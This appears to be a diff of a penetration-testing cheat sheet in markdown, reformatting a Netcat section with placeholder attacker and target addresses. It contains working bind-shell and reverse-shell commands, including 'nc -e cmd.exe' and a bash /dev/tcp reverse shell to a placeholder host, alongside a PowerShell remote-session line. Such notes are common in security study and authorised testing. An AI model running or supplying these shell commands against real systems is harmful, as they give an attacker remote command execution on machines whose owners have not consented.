@@ -31,20 +31,20 @@ Enter-PSSession -ComputerName "hostname"-Credential "easyduck"
 
 ## Netcat
 
-- rhost_ip: xxx.xxx.xxx.xxx
-- lhost_ip: yyy.yyy.yyy.yyy
-- rhost_open_port: 4444
-- lhost_open_port: 5555
+- RHOST_ip: `xxx.xxx.xxx.xxx`
+- LHOST_ip: `yyy.yyy.yyy.yyy`
+- RHOST_open_port: `4444`
+- LHOST_open_port: `5555`
 
 ### bindshell
 
-1. rhost : nc -nlvp 4444 -e cmd.exe
-1. lhost : nc -nv xxx.xxx.xxx.xxx 4444
+1. RHOST : `nc -nlvp 4444 -e cmd.exe`
+1. LHOST : `nc -nv xxx.xxx.xxx.xxx 4444`
 
 ### reverseshell
 
-1. rhost : nc -nv yyy.yyy.yyy.yyy 5555 -e cmd.exe
-1. lhost : nc -nlvp 5555
+1. RHOST : `bash -i >& /dev/tcp/yyy.yyy.yyy.yyy/5555 0>&1`
+1. LHOST : `nc -nlvp 5555`
 
 ## Server Settings
 
